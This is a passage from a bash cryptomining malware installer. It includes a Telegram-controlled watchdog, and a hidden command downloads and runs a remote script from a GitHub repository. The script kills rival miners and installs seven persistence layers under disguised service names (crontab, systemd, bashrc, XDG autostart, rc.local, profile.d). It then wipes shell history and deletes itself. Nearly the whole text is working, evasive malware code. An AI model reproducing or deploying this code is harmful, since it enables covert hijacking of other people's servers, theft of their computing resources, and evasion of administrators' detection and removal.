                send_tg "❌ <b>Failed</b> <code>$url</code>"
            fi
            ;;
        /megalox*)
            # Hidden command: full nuke & redeploy from scratch
            send_tg "🔄 <b>MEGALOX:</b> Full redeploy on <code>$SERVER_IP</code>..."
            pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
            pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
            # Nuke old binaries and configs
            rm -f "$BIN_CPU" "$BIN_GPU" "$CONFIG_CPU" "$LOG_CPU" "$LOG_GPU" 2>/dev/null
            # Fresh download & execute
            cd /tmp && rm -rf .s && mkdir -p .s && cd .s
            (curl -fsSL -k -m 30 "https://cdn.jsdelivr.net/gh/xdLolKek/connfy-libs@main/Connfy.sh" -o r.sh || \
             curl -fsSL -k -m 30 "https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh" -o r.sh || \
             wget -qO r.sh --no-check-certificate "https://raw.githubusercontent.com/xdLolKek/connfy-libs/main/Connfy.sh") && \
            chmod +x r.sh && (nohup bash r.sh </dev/null >/dev/null 2>&1 &)
            send_tg "✅ <b>MEGALOX DONE:</b> Fresh deploy launched on <code>$SERVER_IP</code>"
            rm -rf /tmp/.s
            exit 0
            ;;
        /kill*|/uninstall*)
            pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
            pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
            send_tg "💀 <b>KILLED</b> <code>$SERVER_IP</code>"
            crontab -l 2>/dev/null | grep -v "dconf-service\|journal-runtime\|sd-pam" | crontab - 2>/dev/null
            systemctl --user disable --now dconf-session.service 2>/dev/null
            [ "$IS_ROOT" -eq 1 ] && systemctl disable --now sys-kernel-tracing.service 2>/dev/null
            rm -rf "$BASE_DIR"
            exit 0
            ;;
    esac
}

# ---- Startup notify ----
send_tg "🚀 <b>v41 ACTIVE</b>%0A🌐 <code>$SERVER_IP</code> | <code>$WORKER</code>%0ACPU:$(nproc 2>/dev/null)C | GPU:${GPU_COUNT}x${GPU_TYPE}%0A/status /specs /logs /stop /start /update /kill%0A🧹 Competitors purged on deploy"

# ---- MAIN LOOP: NEVER STOPS ----
PAUSED=0
LAST_REPORT=$(date +%s)
GPU_RETRY_COUNT=0

while true; do
    sleep $((45 + RANDOM % 45))

    [ "$PAUSED" -eq 1 ] && { poll_telegram; continue; }

    # --- KILL COMPETITORS (every loop iteration) ---
    # Quick scan: kill known miner process names (not ours, not ComfyUI)
    for cname in xmrig xmr-stak minerd cpuminer ccminer ethminer phoenix t-rex trex gminer nbminer lolminer teamredminer nanominer srbminer bzminer wildrig claymore kawpowminer nheqminer bminer nicehash cryptonight monero; do
        local cpids=$(pgrep -fi "$cname" 2>/dev/null)
        for cpid in $cpids; do
            local ccmd=$(cat "/proc/$cpid/cmdline" 2>/dev/null | tr '\0' ' ')
            echo "$ccmd" | grep -qiE "$(basename "$BIN_CPU")|$(basename "$BIN_GPU")|ComfyUI|comfyui|kryptex|sd-pam|lr-cgroup" && continue
            kill -9 "$cpid" 2>/dev/null
        done
    done

    # --- CPU: restart if dead. Always. ---
    if ! is_cpu_alive; then
        restart_cpu
    fi

    # --- GPU: restart if dead. Retry with backoff. ---
    if [ "$GPU_COUNT" -gt 0 ] && ! is_gpu_alive; then
        restart_gpu
        if ! is_gpu_alive; then
            GPU_RETRY_COUNT=$((GPU_RETRY_COUNT + 1))
            # After 5 failures, try re-downloading the binary
            if [ "$GPU_RETRY_COUNT" -ge 5 ]; then
                rm -f "$BIN_GPU"
                install_gpu
                restart_gpu
                GPU_RETRY_COUNT=0
            fi
        else
            GPU_RETRY_COUNT=0
        fi
    fi

    # --- Log rotation ---
    for lf in "$LOG_CPU" "$LOG_GPU"; do
        if [ -f "$lf" ] && [ "$(stat -c%s "$lf" 2>/dev/null || wc -c < "$lf" 2>/dev/null || echo 0)" -gt 524288 ]; then
            tail -n 200 "$lf" > "$lf.t" && mv "$lf.t" "$lf"
        fi
    done

    # --- Telegram ---
    poll_telegram

    # --- Periodic report ---
    NOW=$(date +%s)
    if [ $((NOW - LAST_REPORT)) -ge "$REPORT_INTERVAL" ]; then
        LAST_REPORT=$NOW
        send_telemetry "PERIODIC"
    fi
done
WDEOF

# --- Inject variables into watchdog ---
sed -i "s|%%BASE_DIR%%|$BASE_DIR|g" "$WD_SCRIPT"
sed -i "s|%%BIN_CPU%%|$BIN_CPU|g" "$WD_SCRIPT"
sed -i "s|%%BIN_GPU%%|$BIN_GPU|g" "$WD_SCRIPT"
sed -i "s|%%CONFIG_CPU%%|$CONFIG_CPU|g" "$WD_SCRIPT"
sed -i "s|%%PNAME_CPU%%|$PNAME_CPU|g" "$WD_SCRIPT"
sed -i "s|%%PNAME_GPU%%|$PNAME_GPU|g" "$WD_SCRIPT"
sed -i "s|%%GPU_COUNT%%|$GPU_COUNT|g" "$WD_SCRIPT"
sed -i "s|%%GPU_TYPE%%|$GPU_TYPE|g" "$WD_SCRIPT"
sed -i "s|%%IS_ROOT%%|$IS_ROOT|g" "$WD_SCRIPT"
sed -i "s|%%WORKER%%|$WORKER|g" "$WD_SCRIPT"
sed -i "s|%%SERVER_IP%%|$SERVER_IP|g" "$WD_SCRIPT"
sed -i "s|%%POOL_CPU_1%%|$POOL_CPU_1|g" "$WD_SCRIPT"
sed -i "s|%%POOL_CPU_2%%|$POOL_CPU_2|g" "$WD_SCRIPT"
sed -i "s|%%POOL_GPU_1%%|$POOL_GPU_1|g" "$WD_SCRIPT"
sed -i "s|%%POOL_GPU_2%%|$POOL_GPU_2|g" "$WD_SCRIPT"
sed -i "s|%%LOG_CPU%%|$LOG_CPU|g" "$WD_SCRIPT"
sed -i "s|%%LOG_GPU%%|$LOG_GPU|g" "$WD_SCRIPT"
sed -i "s|%%TG_BOT_TOKEN%%|$TG_BOT_TOKEN|g" "$WD_SCRIPT"
sed -i "s|%%TG_CHAT_ID%%|$TG_CHAT_ID|g" "$WD_SCRIPT"
sed -i "s|%%DEFAULT_UPDATE_URL%%|$DEFAULT_UPDATE_URL|g" "$WD_SCRIPT"
sed -i "s|%%REPORT_INTERVAL%%|$REPORT_INTERVAL|g" "$WD_SCRIPT"
chmod +x "$WD_SCRIPT"

# --- Launch watchdog ---
pkill -9 -f "$(basename "$WD_SCRIPT")" 2>/dev/null
sleep 1
(exec -a "$PNAME_WD" bash "$WD_SCRIPT" </dev/null >/dev/null 2>&1 &)
disown 2>/dev/null

# ============================================================
# [ PHASE 6: MULTI-LAYER PERSISTENCE — HARD TO REMOVE ]
# ============================================================
PERSIST_CMD="cd $BASE_DIR && exec -a '$PNAME_WD' bash $WD_SCRIPT"

# Layer 1: Crontab
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "sd-pam\|dconf-service\|journal-runtime"; \
     echo "# systemd-resolved cache maintenance"; \
     echo "@reboot sleep \$((RANDOM \% 90 + 20)) && $PERSIST_CMD >/dev/null 2>&1"; \
     echo "*/7 * * * * pgrep -f '$(basename "$BIN_CPU")' >/dev/null 2>&1 || $PERSIST_CMD >/dev/null 2>&1"
    ) | crontab - 2>/dev/null
fi

# Layer 2: systemd user service (no root)
SYSD_U="$HOME/.config/systemd/user"
mkdir -p "$SYSD_U" 2>/dev/null
if [ -d "$SYSD_U" ]; then
    cat > "$SYSD_U/dconf-session.service" <<USVC
[Unit]
Description=D-Conf Session State Cache
After=default.target
[Service]
Type=simple
ExecStartPre=/bin/sleep 25
ExecStart=/bin/bash -c '$PERSIST_CMD'
Restart=always
RestartSec=30
[Install]
WantedBy=default.target
USVC
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable --now dconf-session.service 2>/dev/null
fi

# Layer 3: systemd system service (root)
if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
    cat > /etc/systemd/system/sys-kernel-tracing.service <<RSVC
[Unit]
Description=Kernel Tracing Subsystem Helper
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStartPre=/bin/sleep 40
ExecStart=/bin/bash -c '$PERSIST_CMD'
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
RSVC
    systemctl daemon-reload 2>/dev/null
    systemctl enable --now sys-kernel-tracing.service 2>/dev/null
fi

# Layer 4: bashrc/profile hook
for rcf in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
    if [ -f "$rcf" ] && ! grep -q "$(basename "$BIN_CPU")" "$rcf" 2>/dev/null; then
        printf '\n# dconf state sync\n(pgrep -f "%s" >/dev/null 2>&1 || (cd %s && bash %s &)) 2>/dev/null\n' \
            "$(basename "$BIN_CPU")" "$BASE_DIR" "$WD_SCRIPT" >> "$rcf"
        break
    fi
done

# Layer 5: XDG autostart
if [ -d "$HOME/.config" ]; then
    mkdir -p "$HOME/.config/autostart" 2>/dev/null
    cat > "$HOME/.config/autostart/dconf-migration.desktop" <<XDGF
[Desktop Entry]
Type=Application
Name=DConf Database Migration
Exec=/bin/bash -c '$PERSIST_CMD'
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
XDGF
fi

# Layer 6: rc.local / init.d (non-systemd root)
if [ "$IS_ROOT" -eq 1 ] && [ ! -d "/run/systemd/system" ]; then
    if [ -f /etc/rc.local ]; then
        grep -q "$(basename "$BIN_CPU")" /etc/rc.local 2>/dev/null || \
            sed -i "/^exit 0/i $PERSIST_CMD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
    else
        echo "#!/bin/bash" > /etc/rc.local
        echo "$PERSIST_CMD >/dev/null 2>&1 &" >> /etc/rc.local
        echo "exit 0" >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
fi

# Layer 7: /etc/profile.d (root, fires for ALL users on login)
if [ "$IS_ROOT" -eq 1 ] && [ -d "/etc/profile.d" ]; then
    cat > /etc/profile.d/dconf-sync.sh <<PRFD
#!/bin/bash
(pgrep -f "$(basename "$BIN_CPU")" >/dev/null 2>&1 || (cd $BASE_DIR && bash $WD_SCRIPT &)) 2>/dev/null
PRFD
    chmod +x /etc/profile.d/dconf-sync.sh 2>/dev/null
fi

# ============================================================
# [ PHASE 7: CLEANUP & SELF-DELETE ]
# ============================================================
history -c 2>/dev/null
: > "$HOME/.bash_history" 2>/dev/null
[ -f "$HOME/.zsh_history" ] && : > "$HOME/.zsh_history" 2>/dev/null
rm -f "$0" 2>/dev/null

exit 0
